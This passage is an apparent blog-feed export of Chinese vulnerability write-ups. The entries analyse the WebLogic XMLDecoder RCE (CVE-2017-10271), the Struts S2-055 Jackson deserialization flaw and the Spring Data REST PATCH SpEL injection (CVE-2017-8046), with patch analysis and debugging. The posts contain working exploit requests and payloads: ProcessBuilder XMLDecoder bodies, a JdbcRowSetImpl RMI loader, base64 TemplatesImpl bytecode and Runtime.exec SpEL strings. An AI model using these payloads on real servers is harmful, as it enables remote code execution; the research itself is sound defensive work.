    <content type="text"><![CDATA[挖矿确实太火，现在只要存在RCE漏洞就会有矿机的身影，这不weblogic又火了一把。这次矿机使用的PoC是wls wsat模块的RCE漏洞，这个漏洞的核心就是XMLDecoder的反序列化漏洞，关于XMLDecoder反序列化的漏洞在2013年就被广泛传播，这次的漏洞是由于官方修复不完善导致被绕过。 1 补丁分析首先来看下weblogic的历史补丁，四月份补丁通告：http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html这里面主要关注CVE-2017-3506，这是web service模块的漏洞。 10月份补丁通告：https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html主要关注CVE-2017-10271，是WLS Security组建的漏洞，英文描述如下：A remote user can exploit a flaw in the Oracle WebLogic Server WLS Security component to gain elevated privileges [CVE-2017-10271].这是CVE-2017-10271的描述信息。测试的poc如下：12345678910111213141516171819202122232425POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.3.216:7001Accept-Encoding: identityContent-Length: 683Accept-Language: zh-CN,zh;q=0.8Accept: */*User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Connection: keep-aliveCache-Control: max-age=0Content-Type: text/xml&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt; 。。。。 &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 对于poc中uri中/wls-wsat/CoordinatorPortType 可以换成CoordinatorPortType11等wsat 这个webservice服务中存在的其他uri执行的效果图如下： 跟踪到底这还是XMLDecoder的漏洞，下面来分析补丁代码：首先来看3506的补丁的分析，在文件weblogic/wsee/workarea/WorkContextXmlInputAdapter.java中，添加了validate方法，方法的实现如下：1234567891011121314151617181920private void validate(InputStream is) &#123; WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try &#123; SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() &#123; public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123; if(qName.equalsIgnoreCase("object")) &#123; throw new IllegalStateException("Invalid context type: object"); &#125; &#125; &#125;); &#125; catch (ParserConfigurationException var5) &#123; throw new IllegalStateException("Parser Exception", var5); &#125; catch (SAXException var6) &#123; throw new IllegalStateException("Parser Exception", var6); &#125; catch (IOException var7) &#123; throw new IllegalStateException("Parser Exception", var7); &#125; &#125; 简单来说就是在解析xml的过程中，如果Element字段值为Object就抛出异常，这简直太脑残了，所以马上就有了CVE-2017-10271。我前段时间分析Oracle Weblogic十月份的补丁的时候看到WorkContextXmlInputAdapter 相关代码时只关注了这块dos的漏洞，没看到10271添加的对new，method，void的去除，还想当然的以为自己找到0day了呢。因为可以通过其他方式绕过，比如典型的就是将object改为void，这是挖矿的人采用的poc，我也想到了，当然也还可以通过new关键字来创建反序列化执行的poc，下面简单示例一下通过new关键字来执行命令：12345&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt; &lt;new class="java.lang.ProcessBuilder"&gt; &lt;string&gt;calc&lt;/string&gt;&lt;method name="start" /&gt; &lt;/new&gt;&lt;/java&gt; 至于为什么XMLDecoder在解析的过程中能执行代码呢，大家可以以如下测试用例进行测试：12345678910&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;void class=&quot;com.sun.rowset.JdbcRowSetImpl&quot;&gt; &lt;void property=&quot;dataSourceName&quot;&gt; &lt;string&gt;rmi://localhost:1099/Exploit&lt;/string&gt; &lt;/void&gt; &lt;void property=&quot;autoCommit&quot;&gt; &lt;boolean&gt;true&lt;/boolean&gt; &lt;/void&gt; &lt;/void&gt;&lt;/java&gt; 是不是觉得变种太多，写法太灵活了，比XStream远程执行代码的要求还低。根据如上poc首先生成JdbcRowSetImpl的实例，接着调用该实例的set方法来初始化该实例的属性，当调用完setAutoCommit接口的时候就会根据dataSourceName的值去远程加载一个类初始化。 针对上面的PoC，官方放出了10271的补丁，补丁如下：1234567891011121314151617181920212223242526272829private void validate(InputStream is) &#123; WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try &#123; SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() &#123; private int overallarraylength = 0; public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123; if(qName.equalsIgnoreCase("object")) &#123; throw new IllegalStateException("Invalid element qName:object"); &#125; else if(qName.equalsIgnoreCase("new")) &#123; throw new IllegalStateException("Invalid element qName:new"); &#125; else if(qName.equalsIgnoreCase("method")) &#123; throw new IllegalStateException("Invalid element qName:method"); &#125; else &#123; if(qName.equalsIgnoreCase("void")) &#123; for(int attClass = 0; attClass &lt; attributes.getLength(); ++attClass) &#123; if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) &#123; throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass)); &#125; &#125; &#125; if(qName.equalsIgnoreCase("array")) &#123; String var9 = attributes.getValue("class"); if(var9 != null &amp;&amp; !var9.equalsIgnoreCase("byte")) &#123; throw new IllegalStateException("The value of class attribute is not valid for array element."); &#125; 这个补丁限定了object，new,method,void，array等字段，就限定了不能生成java 实例。如下的测试用例就不可执行：12345&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;new class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;string&gt;calc&lt;/string&gt;&lt;method name=&quot;start&quot; /&gt; &lt;/new&gt;&lt;/java&gt; 2 动态调试为了更好的理解这个漏洞，我们通过本地的weblogic动态调试一番，PoC还是前面提到的，具体的调用栈如下： 调用栈非常深，我们简单解释一下关键的几个部位，首先是WorkContextServerTube.java中processRequest方法，主要功能就是分割整个xml，抽取真正执行的xml交给readHeadOld方法。1234567891011121314151617181920212223242526272829303132333435public NextAction processRequest(Packet var1) &#123; this.isUseOldFormat = false; if(var1.getMessage() != null) &#123; HeaderList var2 = var1.getMessage().getHeaders(); Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, true); if(var3 != null) &#123; this.readHeaderOld(var3); this.isUseOldFormat = true; &#125; Header var4 = var2.get(this.JAX_WS_WORK_AREA_HEADER, true); if(var4 != null) &#123; this.readHeader(var4); &#125; &#125;protected void readHeaderOld(Header var1) &#123; try &#123; XMLStreamReader var2 = var1.readHeader(); var2.nextTag(); var2.nextTag(); XMLStreamReaderToXMLStreamWriter var3 = new XMLStreamReaderToXMLStreamWriter(); ByteArrayOutputStream var4 = new ByteArrayOutputStream(); XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4); var3.bridge(var2, var5); var5.close(); WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray())); this.receive(var6); &#125; catch (XMLStreamException var7) &#123; throw new WebServiceException(var7); &#125; catch (IOException var8) &#123; throw new WebServiceException(var8); &#125;&#125; 在上述代码中ByteArrayOutputStream var4会被填充为PoC实际执行部分代码即：123456&lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt; &lt;void class="java.lang.ProcessBuilder"&gt; &lt;array class="java.lang.String" length="3"&gt; 。。。 &lt;void method="start"/&gt;&lt;/void&gt; &lt;/java&gt; 接着这部分xml会被传递到XMLDecoder的readObject方法中从而导致反序列化远程代码执行。 总之，尽快打上Weblogic 10月份的补丁。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>Weblogic</tag>
        <tag>反序列化</tag>
        <tag>PoC</tag>
        <tag>XMLDecoder</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[S2-055漏洞环境搭建与分析]]></title>
    <url>%2F2017%2F12%2F06%2FS2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[1 综述2017年12月1日，Apache Struts发布最新的安全公告，Apache Struts 2.5.x REST插件存在远程代码执行的中危漏洞，漏洞编号与CVE-2017-7525相关。漏洞的成因是由于使用的Jackson版本过低在进行JSON反序列化的时候没有任何类型过滤导致远程代码执行。当然官方说的影响是未知，其实这里是远程代码执行。相关链接如下：https://cwiki.apache.org/confluence/display/WW/S2-055影响版本： Struts 2.5 - Struts 2.5.14规避方案立即升级到Struts 2.5.14.1或者升级com.fasterxml.jackson到2.9.2版本 2 技术分析从官方的描述来看，这个就是Jackson的反序列化漏洞，由于Jackson在处理反序列的时候需要支持多态，所以在反序列的时候通过指定特定的类来达到实现多态的目的。这个特性默认是不开启的，所以在Struts2中影响也是有限。 2.1 Jackson多态类型绑定为了让Jackson支持多态，Jackson官方提供了几种方式，下面介绍两种常用方式（https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization）第一种：全局Default Typing机制，启用代码如下：12objectMapper.enableDefaultTyping(); // default to using DefaultTyping.OBJECT_AND_NON_CONCRETEobjectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); 这是一个全局开关，打开之后，在持久化存储数据时会存储准确的类型信息。 第二种：为相应的class添加@JsonTypeInfo注解123public ObjectMapper enableDefaultTyping(DefaultTyping dti) &#123; return enableDefaultTyping(dti, JsonTypeInfo.As.WRAPPER_ARRAY);&#125; 通过阅读源码也能发现，全局Default Typing机制也是通过JsonTypeInfo来实现的。下面来看一个简单的示例：12@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY)class Animal &#123; &#125; 在超类Animal上加上一段@JsonTypeInfo，所有Animal的子类反序列化都可以准确的对于子类型。 这段注解什么意思呢？JsonTypeInfo.Id.CLASS是指序列化或者反序列时都是全名称，如org.codehaus.jackson.sample.Animal,JsonTypeInfo.As.WRAPPER_ARRAY 意为使用数组表示，如123456[ &quot;com.fasterxml.beans.EmployeeImpl&quot;, &#123; ... // actual instance data without any metadata properties &#125;] 2.2 S2-055 环境搭建了解了Jackson的相关多态的特性之后，为了触发反序列化漏洞，必须开启这个特性，再来看看Struts2的相关代码。由于Jackson不是Struts2 json格式的默认处理句柄，首先修改struts.xml,添加如下代码：12&lt;bean type="org.apache.struts2.rest.handler.ContentTypeHandler" name="jackson" class="org.apache.struts2.rest.handler.JacksonLibHandler"/&gt; &lt;constant name="struts.rest.handlerOverride.json" value="jackson"/&gt; 这样Content-Type为application/json格式的请求都交给了JcaksonLibHandler来处理，再来分析下JacksonLibHandler的代码，如下所示：12345public void toObject(Reader in, Object target) throws IOException &#123; mapper.configure(SerializationFeature.WRITE_NULL_MAP_VALUES, false); ObjectReader or = mapper.readerForUpdating(target); or.readValue(in); &#125; 上述代码是处理json反序列的逻辑，很显然没有启用全局Default Typing机制，那么为了触发这个漏洞只能是通过第二种支持多态的方式来打开这个特性。这个漏洞和S2-052非常类似，都是引用的第三方库存在缺陷导致的漏洞，这样的案例数不胜数，在Java生态中简直就是一个灾难，第三方依赖实在太多。为了分析这个漏洞，我们还是拿052的环境来做测试，也就是rest-show-case，环境搭建可以参考http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/，具体的修改如下：1234567891011121314151617public class Order &#123; public String id; @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY) public Object clientName; public int amount; public Order() &#123;&#125; public Order(String id, Object clientName, int amount) &#123; super(); this.id = id; this.clientName = clientName; this.amount = amount; &#125; public void setClientName(Object clientName) &#123; this.clientName = clientName; &#125; 修改部分主要在@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY) public Object clientName; 一个在clientName上方添加注解，打开支持多态的特性，这样我们就能指定clientName的类型；另一个是将clientName的类型改为Object类型，这样就避免了类型不匹配或者不是其子类的错误。相应地修改setClientName方法的传入类型为Object。 2.3 PoC构造Jackson已经暴露了很多种PoC在外，下面我们拿com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl来做示例，具体的PoC如下：12345678910111213141516POST /orders HTTP/1.1Host: 192.168.3.103:8080Proxy-Connection: keep-aliveContent-Length: 2157Cache-Control: max-age=0Origin: http://192.168.3.103:8080Upgrade-Insecure-Requests: 1Content-Type: application/jsonUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://192.168.3.103:8080/orders/newAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,zh-TW;q=0.6Cookie: csrftoken=LYokAxo4ABMl0wKhLhkdl1x5I0AQQDE8E3L1zcc3A1YVybHMEHkOWq01VqdnfJEm; JSESSIONID=7367044F7C24B8BE7CDE5444E28E2BF4&#123;&quot;clientName&quot;:[&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&#123;&quot;transletBytecodes&quot;:[&quot;yv66vgAAADEANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1McGVyc29uL1Rlc3Q7AQAKRXhjZXB0aW9ucwcALAEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAF0BwAuAQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwACAAJBwAvDAAwADEBAARjYWxjDAAyADMBAAtwZXJzb24vVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAAPAAQAEAANABEADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAEACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAVAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIAAAABABcAGAADAAEAEQAZAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAaAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGgAbAAIADwAAAAQAAQAcAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAAB0ACAAeAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk&quot;],&quot;transletName&quot;:&quot;a.b&quot;,&quot;outputProperties&quot;:&#123;&#125;&#125;]&#125; 首先将ContentType设置为application/json，这样请求才会丢给Jackson处理。这里最核心的部分就是clientName字段了，必须和前面注解部分绑定，也就是这个字段必须有，很显然，这个漏洞不具有通用性，首先得有一个Object类型的字段，其次这个字段还必须用注解JsonTypeInfo修饰。这种情况应该少之又少。下面给个计算器的图吧。]]></content>
      <categories>
        <category>Struts2</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>反序列化</tag>
        <tag>Struts2</tag>
        <tag>S2-055</tag>
        <tag>CVE-2017-7525</tag>
        <tag>Jackson</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java JSON反序列化之殇-看雪安全开发者峰会]]></title>
    <url>%2F2017%2F11%2F23%2FJava%20JSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E6%AE%87-%E7%9C%8B%E9%9B%AA%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B3%B0%E4%BC%9A%2F</url>
    <content type="text"><![CDATA[综合这是我在看雪2017安全开发者峰会的议题《Java JSON反序列之殇》的内容，主要涉及Java JSON常用库GSON，Jackson，Fastjson的使用，安全特性，反序列化安全特性，Fastjson架构，Fastjson RCE的PoC，从TemplateImpl，JNDI Bean Property和JNDI Field做了分类整理分析，最后会涉及JAVA JSON反序列化防御和Java反序列化防御。详情请参考PPT内容。pdf无法显示，直接右键另存为即可或者从github上下载：https://github.com/shengqi158/fastjson-remote-code-execute-poc/blob/master/Java_JSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E6%AE%87_%E7%9C%8B%E9%9B%AA%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B3%B0%E4%BC%9A.pdf]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JSON</tag>
        <tag>反序列化</tag>
        <tag>看雪</tag>
        <tag>安全开发者峰会</tag>
        <tag>反序列化防御</tag>
        <tag>PPT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Data Rest服务器PATCH请求远程代码执行漏洞CVE-2017-8046补充分析]]></title>
    <url>%2F2017%2F10%2F02%2FSpring%20Data%20Rest%E6%9C%8D%E5%8A%A1%E5%99%A8PATCH%E8%AF%B7%E6%B1%82%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-8046%E8%A1%A5%E5%85%85%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[1 综述 近日，Pivotal官方发布通告表示Spring-data-rest服务器在处理PATCH请求时存在一个远程代码执行漏洞（CVE-2017-8046）。攻击者可以构造恶意的PATCH请求并发送给spring-date-rest服务器，通过构造好的JSON数据来执行任意Java代码。官方已经发布了新版本修复了该漏洞。 相关地址：https://pivotal.io/security/cve-2017-8046 受影响的版本 Spring Data REST versions &lt; 2.5.12, 2.6.7, 3.0 RC3 Spring Boot version &lt; 2.0.0M4 Spring Data release trains &lt; Kay-RC3 不受影响的版本 Spring Data REST 2.5.12, 2.6.7, 3.0RC3 Spring Boot 2.0.0.M4 Spring Data release train Kay-RC3 解决方案官方已经发布了新版本修复了该漏洞，受影响的用户请尽快升级至最新版本来防护该漏洞。 参考链接：https://projects.spring.io/spring-data-rest/https://projects.spring.io/spring-boot/ 2 补丁分析：从官方的描述来看就是就是Spring-data-rest服务处理PATCH请求不当，导致任意表达式执行从而导致的RCE。首先来看下补丁，主要是evaluateValueFromTarget添加了一个校验方法verifyPath，对于不合规格的path直接报异常退出，主要是property.from(pathSource,type)实现，基本逻辑就是通过反射去验证该Field是否存在于bean中。 3 复现：直接拉取https://github.com/spring-projects/spring-boot/tree/master/spring-boot-samples，找到spring-rest-data这个项目，直接用IDEA一步步导入进去即可，直接运行就能看到在本地的8080端口起了jetty服务。但是请注意这编译好的是最新版本，要引入漏洞，当然得老版本，修改pom.xml,添加plugin，具体如下：12345&lt;dependency&gt; &lt;groupId&gt;org.springframework.data&lt;/groupId&gt; &lt;artifactId&gt;spring-data-rest-webmvc&lt;/artifactId&gt; &lt;version&gt;3.0.0.RC2&lt;/version&gt;&lt;/dependency&gt; 从项目test目录找到相关请求形式，发送http://127.0.0.1:8080/api/cities/1即可看到回显表明服务正常启动。测试poc的效果如下： 这个poc的几个关键点在于：Content-Type: application/json-patch+json，path路径一定得用斜杠/隔开，至于为什么，后续会讲到。op支持的操作符很多，包括test，add，replace等都可以触发，op不同，path中添加的poc可以不一样，如op为test时就少了很多限制。如下是op为add时候的请求body。 1[&#123;"op":"add","path":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;112, 105, 110, 103, 32, 49, 57, 50, 46, 49, 54, 56, 46, 51, 46, 49, 48, 54&#125;))/xxlegend"&#125;] 执行ping 192.168.3.106 3 分析：漏洞的触发过程详细分析见文档：https://mp.weixin.qq.com/s/uTiWDsPKEjTkN6z9QNLtSA，这里已经描述的比较清楚，在这里不再重述，这篇文档后续的分析主要是对poc的一些解读。随便拿一个以前spring表达式注入的poc作为path的参数值，如poc：12[&#123;"op":"add","path":"new java.lang.String(new byte[]&#123;70, 66, 66, 50, 48, 52, 65, 52, 48, 54, 49, 70, 70, 66, 68, 52, 49, 50, 56, 52, 65, 56, 52, 67, 50, 53, 56, 67, 49, 66, 70, 66&#125;)"&#125;] 这个请求的特别之处在于path字段值后边没有了斜杠。会报如下错误：123456789Caused by: org.springframework.expression.spel.SpelEvaluationException: EL1032E: setValue(ExpressionState, Object) not supported for 'class org.springframework.expression.spel.ast.ConstructorReference' at org.springframework.expression.spel.ast.SpelNodeImpl.setValue(SpelNodeImpl.java:148) at org.springframework.expression.spel.standard.SpelExpression.setValue(SpelExpression.java:416) at org.springframework.data.rest.webmvc.json.patch.PatchOperation.addValue(PatchOperation.java:148) at org.springframework.data.rest.webmvc.json.patch.AddOperation.perform(AddOperation.java:48) at org.springframework.data.rest.webmvc.json.patch.Patch.apply(Patch.java:64) at org.springframework.data.rest.webmvc.config.JsonPatchHandler.applyPatch(JsonPatchHandler.java:91) at org.springframework.data.rest.webmvc.config.JsonPatchHandler.apply(JsonPatchHandler.java:83) at org.springframework.data.rest.webmvc.config.PersistentEntityResourceHandlerMethodArgumentResolver.readPatch(PersistentEntityResourceHandlerMethodArgumentResolver.java:200) 说明path参数确实被污染，此处存在表达式注入漏洞，虽然已经进入表达式的执行流程，但是这里却报错退出。离RCE还差一步，查看org.springframework.expression.spel.ast.SpelNodeImpl.setValue方法12345@Overridepublic void setValue(ExpressionState expressionState, Object newValue) throws EvaluationException &#123; throw new SpelEvaluationException(getStartPosition(), SpelMessage.SETVALUE_NOT_SUPPORTED, getClass());&#125; 这个方法直接抛出异常，那看来poc离执行还有一段距离。直接调出setValue的实现，发现有五个地方重写了该方法。SpelNodeImpl的setValue也在其中，但是它是直接抛出异常的，算一个异常检查吧。查看他们的实现，只有CompoundExpression,Indexer,PropertyOrFieldReference真正存在执行表达式。 查看相关文档得知 CompoundExpression是复杂表达式，用.连接起来的都算。Indexer一般是这么表示test[xxlegend]，那么可以把poc改成12[&#123;"op":"add","path":"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;112, 105, 110, 103, 32, 49, 57, 50, 46, 49, 54, 56, 46, 51, 46, 49, 48, 54&#125;))[xxlegend]"&#125;] 这也是可以运行的。再看调用栈也是符合我们刚才理解到SpelExpression.setValue–》 CompoundExpression.setValue–》 CompoundExpression.getValueRef–》 Indexer.getValueRef–》 PropertyOrFieldReference.getValueInternal–》 PropertyOrFieldReference.readProperty 1234567891011121314Caused by: org.springframework.expression.spel.SpelEvaluationException: EL1008E: Property or field 'xxlegend' cannot be found on object of type 'sample.data.rest.domain.City' - maybe not public? at org.springframework.expression.spel.ast.PropertyOrFieldReference.readProperty(PropertyOrFieldReference.java:224) ~[spring-expression-4.3.7.RELEASE.jar:4.3.7.RELEASE] at org.springframework.expression.spel.ast.PropertyOrFieldReference.getValueInternal(PropertyOrFieldReference.java:94) ~[spring-expression-4.3.7.RELEASE.jar:4.3.7.RELEASE] at org.springframework.expression.spel.ast.PropertyOrFieldReference.getValueInternal(PropertyOrFieldReference.java:81) ~[spring-expression-4.3.7.RELEASE.jar:4.3.7.RELEASE] at org.springframework.expression.spel.ast.Indexer.getValueRef(Indexer.java:123) ~[spring-expression-4.3.7.RELEASE.jar:4.3.7.RELEASE] at org.springframework.expression.spel.ast.CompoundExpression.getValueRef(CompoundExpression.java:66) ~[spring-expression-4.3.7.RELEASE.jar:4.3.7.RELEASE] at org.springframework.expression.spel.ast.CompoundExpression.setValue(CompoundExpression.java:95) ~[spring-expression-4.3.7.RELEASE.jar:4.3.7.RELEASE] at org.springframework.expression.spel.standard.SpelExpression.setValue(SpelExpression.java:416) ~[spring-expression-4.3.7.RELEASE.jar:4.3.7.RELEASE] at org.springframework.data.rest.webmvc.json.patch.PatchOperation.addValue(PatchOperation.java:148) ~[spring-data-rest-webmvc-3.0.0.RC2.jar:na] at org.springframework.data.rest.webmvc.json.patch.AddOperation.perform(AddOperation.java:48) ~[spring-data-rest-webmvc-3.0.0.RC2.jar:na] at org.springframework.data.rest.webmvc.json.patch.Patch.apply(Patch.java:64) ~[spring-data-rest-webmvc-3.0.0.RC2.jar:na] at org.springframework.data.rest.webmvc.config.JsonPatchHandler.applyPatch(JsonPatchHandler.java:91) ~[spring-data-rest-webmvc-3.0.0.RC2.jar:na] at org.springframework.data.rest.webmvc.config.JsonPatchHandler.apply(JsonPatchHandler.java:83) ~[spring-data-rest-webmvc-3.0.0.RC2.jar:na] at org.springframework.data.rest.webmvc.config.PersistentEntityResourceHandlerMethodArgumentResolver.readPatch(PersistentEntityResourceHandlerMethodArgumentResolver.java:200) ~[spring-data-rest-webmvc-3.0.0.RC2.jar:na] 前面都是讲path参数，也就是表达式的写法。在这个poc中还用到op参数，op表示要执行的动作，在代码中定义了add,copy,from,move,replace,test这么多操作值，add，test，replace可直接触发漏洞，并且test非常直接，path参数值无需斜杠/，[]来分割，poc如下：12[&#123;&quot;op&quot;:&quot;test&quot;,&quot;path&quot;:&quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;112, 105, 110, 103, 32, 49, 57, 50, 46, 49, 54, 56, 46, 51, 46, 49, 48, 54&#125;))&quot;&#125;] 很明显这个poc的path参数值无线跟/ []来分割参数。原因就是它调用的是SpelExpression.getValue，而非test情况下的poc最终调用的都是SpelExpression.setValue，通过setValue调用getValueRef来达到表达式注入。下面看看test的调用栈：这个点官方也没修，但是有个限制：12345678910@Override&lt;T&gt; void perform(Object target, Class&lt;T&gt; type) &#123; Object expected = normalizeIfNumber(evaluateValueFromTarget(target, type)); Object actual = normalizeIfNumber(getValueFromTarget(target)); if (!ObjectUtils.nullSafeEquals(expected, actual)) &#123; throw new PatchException("Test against path '" + path + "' failed."); &#125;&#125; evaluateValueFromTarget运行在前，会报错退出，导致getValueFromTarget不会被执行，怎么绕过去呢？值得思考。]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>表达式注入</tag>
        <tag>RCE</tag>
        <tag>Spring DATA REST</tag>
        <tag>CVE-2017-8046</tag>
        <tag>PATCH</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[S2-052漏洞分析及官方缓解措施无效验证]]></title>
    <url>%2F2017%2F09%2F29%2FS2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81%2F</url>
